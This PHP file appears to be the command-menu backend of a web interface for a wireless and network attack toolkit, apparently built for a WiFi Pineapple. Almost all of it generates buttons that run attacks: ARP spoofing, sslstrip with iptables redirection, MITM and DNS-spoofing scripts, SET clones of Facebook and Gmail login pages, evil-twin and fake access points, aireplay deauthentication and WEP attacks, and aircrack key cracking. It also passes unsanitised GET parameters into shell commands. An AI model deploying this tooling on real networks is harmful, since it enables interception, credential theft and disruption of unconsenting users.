<?php
	include "uwui_vars.php";

	function action($cmd,$label){
		global $debug;
		if ($label=="" || $debug) $label=$cmd;
		echo "<input type=button onclick=\"javascript:acction('cmd=$cmd');\" value='$label'><br>";
	}
	function action_bg($cmd,$label){
		global $debug;
		if ($label=="" || $debug) $label=$cmd;
		echo "<input type=button style='border-color:blue;background-color:darkblue;' onclick=\"javascript:acction('cmd_bg=$cmd');\" value='$label'><br>";
	}
	function action_pine($cmd,$label){
		global $debug;
		if ($label=="" || $debug) $label=$cmd;
		echo "<input type=button style='border-color:red;background-color:darkred;' onclick=\"javascript:acction('cmd_pine=$cmd');\" value='$label'><br>";
	}
	function action_pine_bg($cmd,$label){
		global $debug;
		if ($label=="" || $debug) $label=$cmd;
		echo "<input type=button style='border-color:red;background-color:darkred;' onclick=\"javascript:acction('cmd_pine_bg=$cmd');\" value='$label'><br>";
	}
	function view_file($file,$label){
		global $debug;
		if ($label=="" || $debug) $label=$file;
		echo "<input type=button onclick=\"javascript:acction('cmd=strings $file');\" value='$label'><br>";
		//echo "<input type=button onclick=\"javascript:window.open('php/view_file.php?file=$file','$label','width=600,height=600,scrollbars=yes,location=no');\" value='$label'><br>";
	}
	function open_url($url,$label){
		global $debug;
		if ($label=="" || $debug) $label=$url;
		echo "<input type=button onclick=\"javascript:window.open('$url','$label','width=600,height=600,scrollbars=yes,location=no');\" value='$label'><br>";
	}
	function check_action($file,$cmd1,$cmd2,$label){
		if (file_exists($file)) {$state="checked"; $cmd=$cmd1;} else { $state=""; $cmd=$cmd2;}
		echo "<input type='checkbox' name='check_action' onclick=\"javascript:acction('cmd=$cmd');\" value='$state' $state>$label<br>";

	}
	// ===============================================================

	if ( isset($_GET["tipo"]) && isset($_GET["valor"]) && isset($_GET["valor2"]) && isset($_GET["valor3"]) ) {
		$tipo = $_GET["tipo"];
		$valor = $_GET["valor"];
		$valor2 = $_GET["valor2"];
		$valor3 = $_GET["valor3"];

		if ($tipo=="system") {
			echo "<input type=button onclick=\"javascript:open_terminal();\" value='Open MultiTerminal'><br>";
			echo "<hr color='green'>";
			action("sysctl -w net.ipv4.ip_forward=1","");
			action("sh ../scripts/iptables_flush.sh","IPTables Flush");
			if ($system!="pineapple" && $debug){
				echo "<hr color='green'>";
				action_bg("sh /usr/local/bin/beef_launch.sh >/dev/null 2>/dev/null","Beef");
				open_url("http://127.0.0.1:3000/ui/panel","Beef Web Interface");
			}
			echo "<hr color='green'>";
			action("ps -ef","Current Processes");
			action("df -h","File System Disk Space Usage");
			if ($system!="pineapple"){
				echo "<hr color='green'>";
				view_file("/var/log/apache2/error.log","View Apache error.log");
				view_file("/var/log/apache2/access.log","View Apache access.log");
			}
			echo "<hr color='green'>";
			action("rm ../data/* 2>/dev/null","Delete All Data Files");
			action("rm ../data/locations/* 2>/dev/null","Delete All Locations");
			action("rm ../data/vault/* 2>/dev/null","Delete All Vault Files");
			action("rm ../data/keys/* 2>/dev/null","Delete All Keys Files");
			echo "<hr color='green'>";			
			check_action("../cfg/hide_processes.flag","rm ../cfg/hide_processes.flag","touch ../cfg/hide_processes.flag","Hide BlackList Processes");
		} 

		if ($tipo=="interface_eth" || $tipo=="interface") { 
			if ($valor2=="DOWN"){
				action("ifconfig $valor up","");
				action("ifconfig $valor 0.0.0.0","");
				action("macchanger -r $valor","");
				action("macchanger --mac=##OPTION1## $valor","");
				if (exec("${sudo}ethtool -i $valor 2>/dev/null | grep bridge")!="") { 
					echo "<hr color='green'>";			
					action("brctl delbr $valor 2>/dev/null","Delete Bridge");
				}
				if ($tipo=="interface") { 
					echo "<hr color='green'>";
					action("airmon-ng start $valor","");
					action("airmon-ng start $valor ##OPTION1##","");
				}
			}
			if ($valor2=="UP"){
				action("ifconfig $valor down","");
				action_bg("dhclient $valor 2>../data/dhclient.log 1>/dev/null","dhclient $valor");
				if (exec("${sudo}ifconfig $valor | grep 'inet addr'")!="") {
					$gateway=exec("${sudo}route -n | grep '$valor' | grep 'UG' | tr -s ' ' | cut -d' ' -f2");
					if ($gateway!="") {
						$my_ip=exec("${sudo}ifconfig $valor 2>/dev/null|grep 'inet addr'|tr -s ' '|tr -s ':' ' '|cut -d' ' -f 4");
						echo "<hr color='green'>";
						action("nslookup google.es","");
						action_bg("sh ../scripts/live_nslookup.sh >../data/nslookup.log 2>/dev/null","nslookup google.es Recursive");			
						echo "<hr color='green'>";
						if ($system=="pineapple"){
							action_pine("nmap -e $valor $gateway/24","");
							action_pine("nmap -e $valor -A $gateway/24","");
						} else {
							action("nmap -e $valor $gateway/24","");
							action("nmap -e $valor -A $gateway/24","");
						}
						echo "<hr color='green'>";
						action_bg("arpspoof -i $valor $gateway >/dev/null 2>../data/arpsoopf.log","arpspoof -i $valor $gateway");
						if ($system=="pineapple"){
							action_pine_bg("tcpdump -w ../data/captura.pcap -i $valor >/dev/null 2>/dev/null","tcpdump -w ../data/captura.pcap -i $valor");
						} else {
							action_bg("tcpdump -w ../data/captura.pcap -i $valor >/dev/null 2>/dev/null","tcpdump -w ../data/captura.pcap -i $valor");
						}
						action_bg("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000","");
						action_bg("sslstrip -s -w ../data/sslstrip_$valor.log -p 10000 >/dev/null 2>/dev/null","sslstrip -s -w ../data/sslstrip_$valor.log -p 10000");
						echo "<hr color='green'>";
						action("sh ../scripts/mitm.sh $valor $gateway","MITM Script");
						action("sh ../scripts/mitm_ssl.sh $valor $gateway","MITM && SSLSTRIP Script");
						if ($system!="pineapple" && $debug){			
							echo "<hr color='green'>";
							action_bg("sh ../scripts/set.sh $my_ip http://www.facebook.com facebook >../data/set.log 2>../data/set2.log","SET - Clone Site www.facebook.com");			
							action_bg("sh ../scripts/set.sh $my_ip http://mail.google.com/mail google >../data/set.log 2>../data/set2.log","SET - Clone Site mail.google.com/mail");							
							echo "<hr color='green'>";
							action_bg("dnsspoof -i $valor -f ../cfg/dnsspoof.cfg >/dev/null 2>../data/dnssoopf.log","dnsspoof -i $valor -f ../cfg/dnsspoof.cfg");
						}
					}
				} 
				else {
					if ($tipo=="interface"){
						echo "<hr color='green'>";			
						if (file_exists("../cfg/hide_aps_$valor.flag")) action("rm ../cfg/hide_aps_$valor.flag","Start iwlist"); else action("touch ../cfg/hide_aps_$valor.flag","Stop iwlist");
					}
				}
				if (exec("${sudo}ethtool -i $valor 2>/dev/null | grep tun")!="") { 
					echo "<hr color='green'>";			
					action("sh ../scripts/bridge.sh $valor ##OPTION1##","Create Bridge");			

				}

				if ($system!="pineapple" && $tipo=="interface") { 
					echo "<hr color='green'>";
					action("airmon-ng start $valor","");
					action("airmon-ng start $valor ##OPTION1##","");
				}

			}
		}

		if ($tipo=="monitor" ) { 
			action("airmon-ng stop $valor","");
			echo "<hr color='green'>";
			action_bg("airodump-ng --output-format csv -w ../data/captura $valor >/dev/null 2>/dev/null","Airodump CSV");
			action_bg("airodump-ng --encrypt wep --output-format csv -w ../data/captura $valor >/dev/null 2>/dev/null","Airodump CSV WEP");
			action_bg("airodump-ng --output-format pcap -w ../data/captura $valor >/dev/null 2>/dev/null","Airodump PCAP");
			action_bg("airodump-ng --output-format csv,pcap -w ../data/captura $valor >/dev/null 2>/dev/null","Airodump CSV,PCAP");
			echo "<hr color='green'>";
			action_bg("airbase-ng --essid freewifi -a AA:AA:AA:AA:AA:AA -c 6 $valor >../data/airbase.log 2>/dev/null","Create Fake AP");
		}

		if ($tipo=="file") {
			view_file("$valor","View File");
			action("rm $valor","Delete File");
			action("mv $valor ../data/vault","Move File to Vault");
			if ( pathinfo($valor, PATHINFO_EXTENSION) == "csv" ) {
				echo "<hr color='green'>";
				action("sh ../scripts/mark_stations.sh $valor ##OPTION1## 2>/dev/null","Set Stations in Location");
				action("sh ../scripts/find_matches.sh $valor 2>/dev/null","Find Matches");
				if ($system!="pineapple"){
					echo "<hr color='green'>";
					open_url("php/autodecrypter.php?file=$valor","AutoDecrypter");
				}
				echo "<hr color='green'>";
				check_action("../cfg/show_stations.flag","rm ../cfg/show_stations.flag","touch ../cfg/show_stations.flag","Show Stations");
				check_action("../cfg/show_offline.flag","rm ../cfg/show_offline.flag","touch ../cfg/show_offline.flag","Show Offline AP & Stations");
				echo "<hr width=180 color='green'>";
				check_action("../cfg/show_only_matches.flag","rm ../cfg/show_only_matches.flag","touch ../cfg/show_only_matches.flag","Show Only Matches Stations");

			}
			if ( pathinfo($valor, PATHINFO_EXTENSION) == "pcap" ) {
				echo "<hr color='green'>";
				action("strings $valor | grep ^Host: | sort | uniq","Show Host");
				action_bg("sh ../scripts/live_host.sh $valor >../data/host.log 2>/dev/null","Show Host Recursive");			
				action("strings $valor | grep ^User-Agent | sort | uniq","Show User-Agent");
				action_bg("sh ../scripts/live_user-agent.sh $valor >../data/user-agent.log 2>/dev/null","Show User-Agent Recursive");
				if ($system!="pineapple"){		
					action("ngrep -I $valor Host:","ngrep Host");
					action("urlsnarf -p  $valor","urlsnarf");
				}
			}
		}

		if ($tipo=="proceso") {
			action("kill -9 $valor","Kill Process");
			action("echo $valor2 >> ../cfg/hide_process.cfg","Hide Process");
		}	

		if ($tipo=="ap") {
			$cmd = "sh ../scripts/connect_ap.sh $valor2 $valor ##OPTION1##";
			if (file_exists("../data/vault/$valor3.key")) {
				$key=exec("${sudo}cat ../data/vault/$valor3.key");
				$cmd=str_replace("##OPTION1##","$key",$cmd);
				view_file("../data/vault/$valor3.key","View Key");
			}
			action_bg("$cmd","Connect to AP");
			action("echo ##OPTION1## > ../data/vault/$valor3.key","Save Key");
		}	

		if ($tipo=="ap_monitor") {
			exec("${sudo}ifconfig | grep mon | cut -d' ' -f1",$list_monitor);
				$ap_data=exec("${sudo}strings $valor2 | grep '^$valor' | tr -s ' ' ");
				$valores_ap = explode(",",$ap_data,15);
				$essid=trim($valores_ap[13]);
				$channel=trim($valores_ap[3]);
				$file_cap=str_replace("csv","cap",$valor2);
				$secu=trim($valores_ap[5]);
				if (count($list_monitor)==1) $option=$list_monitor[0]; else $option="##OPTION1##";
			action_bg("airodump-ng --channel $channel --bssid $valor --output-format csv -w ../data/$valor $option >/dev/null 2>/dev/null","Airodump CSV");
			action_bg("airodump-ng --channel $channel --bssid $valor --output-format pcap -w ../data/$valor $option >/dev/null 2>/dev/null","Airodump CAP");
			action_bg("airodump-ng --channel $channel --bssid $valor --output-format csv,pcap -w ../data/$valor $option >/dev/null 2>/dev/null","Airodump CSV,CAP");
			echo "<hr color='green'>";
			action_bg("aireplay-ng -1 30 -e $essid -a $valor -h ##OPTION2## $option >../data/fakestation.log 2>/dev/null","Aireplay Fake Station");
			action_bg("aireplay-ng -0 0 -a $valor -h $valor $option >../data/aireplay_deauth_ap.log 2>/dev/null","Aireplay Deauthenticate 0");
			
			if ($system!="pineapple" && $debug){
				echo "<hr color='green'>";
				$para="";
				if ($secu=="WEP") $para="-z 5";
				if ($secu=="WPA") $para="-z 2";
				if ($secu=="WPA2" || $secu=="WPA2WPA") $para="-Z 1";
				action_bg("airbase-ng --essid $essid -a $valor -c $channel $para $option >../data/airbase.log 2>/dev/null","Create Evil Twin AP $secu");
				echo "<hr color='green'>";
				$mac_min=strtoupper(substr($valor,0,8));
				action("strings ../nic.txt | grep $mac_min ","Lookup MAC Address");
				if (file_exists("$file_cap")) {
					echo "<hr color='green'>";	
					action("tshark -n -r $file_cap eapol 2>/dev/null | grep -i $valor","View HandShakes");
				}
			}
			echo "<hr color='green'>";
			if (file_exists("$file_cap")) action_bg("aircrack-ng -b $valor $file_cap >../data/aircrack.log 2>/dev/null","Aircrack");
			action("echo ##OPTION1## > ../data/vault/$valor.key","Save Key");
			$valores_ap = null;
		}

		if ($tipo=="station") {
			exec("${sudo}ifconfig | grep mon | cut -d' ' -f1",$list_monitor);
			$stations_data=exec("${sudo}strings $valor2 | grep '$valor' | tr -s ' ' ");
				list($v1,$v2,$v3,$v4,$v5,$v6,$v7) = explode(",",$stations_data,7);
				$bssid = trim($v6);
				$ap_data=exec("${sudo}strings $valor2 | grep '^$bssid' | tr -s ' ' ");
				$valores_ap = explode(",",$ap_data,15);
				$essid=trim($valores_ap[13]);
				$channel=trim($valores_ap[3]);
				if (count($list_monitor)==1) $option=$list_monitor[0]; else $option="##OPTION1##";
			action_bg("aireplay-ng -3 -b $bssid -h $valor $option >../data/aireplay_arp.log 2>/dev/null","Aireplay ARP-Request Replay");
			action_bg("aireplay-ng -0 5 -a $bssid -h $bssid -c $valor $option >../data/aireplay_deauth_5.log 2>/dev/null","Aireplay Deauthenticate 5");
			action_bg("aireplay-ng -0 ##OPTION1## -a $bssid -c $valor $option >../data/aireplay_deauth_X.log 2>/dev/null","Aireplay Deauthenticate ##OPTION1##");
			action_bg("aireplay-ng -0 0 -a $bssid -h $bssid-c $valor $option >../data/aireplay_deauth_0.log 2>/dev/null","Aireplay Deauthenticate 0");
			echo "<hr color='green'>";
			action_bg("sh ../scripts/fragment.sh $bssid $valor $option","Aireplay Fragment Attack");
			action_bg("sh ../scripts/chopchop.sh $bssid $valor $option","Aireplay ChopChop Attack");

			if ($valor!=""){
				echo "<hr color='green'>";
				$mac_min=strtoupper(substr($valor,0,8));
				action("strings ../nic.txt | grep $mac_min ","Lookup MAC Address");
				echo "<hr color='green'>";
				$mac=strtoupper($valor);
				if (file_exists("../data/vault/$mac.target")) action("rm ../data/vault/$mac.target","Remove As Target"); else action("touch ../data/vault/$mac.target","Set As Target");
				action("echo ##OPTION1## >../data/vault/$mac.alias","Set Alias");
				if (file_exists("../data/vault/$mac.alias")) action("rm ../data/vault/$mac.alias 2>/dev/null","Remove Alias");
			}
			$valores_ap = null;
		}	

		if ($tipo=="ip") {
			action("ping -I $valor2 -c 5 $valor","");
			echo "<hr color='green'>";
			action("nmap -e $valor2 $valor","");
			action("nmap -A -e $valor2 $valor","");
			echo "<hr color='green'>";
			$gateway=exec("${sudo}route -n | grep '$valor2' | grep 'UG' | tr -s ' ' | cut -d' ' -f2");
			if ($gateway!="") {
				action_bg("arpspoof -i $valor2 -t $valor $gateway >../data/arpsoopf1.log 2>/dev/null","arpspoof -i $valor2 -t $valor $gateway");
				action_bg("arpspoof -i $valor2 -t $gateway $valor >../data/arpsoopf2.log 2>/dev/null","arpspoof -i $valor2 -t $gateway $valor");
				if ($system=="pineapple"){
					action_pine_bg("tcpdump -w ../data/captura_$valor.pcap -i $valor2 host $valor >/dev/null 2>/dev/null","tcpdump -w ../data/captura_$valor.pcap -i $valor2 host $valor");
				} else {
					action_bg("tcpdump -w ../data/captura_$valor.pcap -i $valor2 host $valor >/dev/null 2>/dev/null","tcpdump -w ../data/captura_$valor.pcap -i $valor2 host $valor");
				}

				$mac=exec("${sudo}cat /proc/net/arp | grep $valor2 | grep $valor | tr -s ' ' | cut -d' ' -f4");
				if ($system!="pineapple" && $debug){
					echo "<hr color='green'>";
					action_bg("dnsspoof -i $valor2 -f ../cfg/dnsspoof.cfg host $valor >/dev/null 2>../data/dnssoopf.log","dnsspoof -i $valor2 -f ../cfg/dnsspoof.cfg host $valor");
				}
				echo "<hr color='green'>";			
				action("sh ../scripts/mitm_ip.sh $valor2 $gateway $valor","MITM Script");
			}

			$mac=$valor3;
			if ($mac!=""){
				echo "<hr color='green'>";
				$mac=strtoupper($mac);
				if (file_exists("../data/vault/$mac.target")) action("rm ../data/vault/$mac.target","Remove As Target"); else action("touch ../data/vault/$mac.target","Set As Target");
				action("echo ##OPTION1## >../data/vault/$mac.alias","Set Alias");
				if (file_exists("../data/vault/$mac.alias")) action("rm ../data/vault/$mac.alias 2>/dev/null","Remove Alias");
			}
		}
	}
?>
